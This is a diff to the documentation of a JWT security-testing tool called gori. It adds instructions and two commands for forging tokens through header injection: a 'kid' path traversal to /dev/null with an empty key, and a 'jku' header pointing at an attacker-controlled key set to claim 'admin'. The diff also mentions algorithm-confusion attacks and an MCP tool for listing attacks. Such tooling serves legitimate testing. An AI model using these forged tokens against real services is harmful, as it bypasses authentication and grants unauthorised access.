@@ -64,6 +64,13 @@ gori run jwt eyJhbGci... --attacks
 gori run jwt eyJhbGci... --attacks --key ./server-public.pem   # ...plus algorithm confusion
 ```
 
+To hand-craft a header-injection token rather than take the generated set — point `kid` at a file, set a `jku`/`jwk` to key material you control — edit the header on `--encode` with `--set-header FIELD=VALUE` (repeatable) or `--header JSON`; `alg` still comes from `--alg`:
+
+```bash
+gori run jwt eyJhbGci... --encode --set-header kid=../../dev/null --secret ''   # empty-key kid traversal
+gori run jwt --encode --header '{"jku":"https://you/jwks.json"}' --payload '{"sub":"admin"}' --alg RS256 --key ./yours.pem
+```
+
 The public key is whatever the target publishes: a JWKS `x5c` certificate works as well as a bare `PUBLIC KEY` block, and gori reduces either to the SPKI PEM a server would hold.
 
 Over MCP the `jwt_attacks` tool returns the identical list, taking the same key as `public_key` (and `jwt_decode` / `jwt_verify` / `jwt_encode` cover steps 1 and 2). All of them are read tools available even under `--read-only`: they touch no network and write nothing, though a `key` / `public_key` given as a path is read from disk.
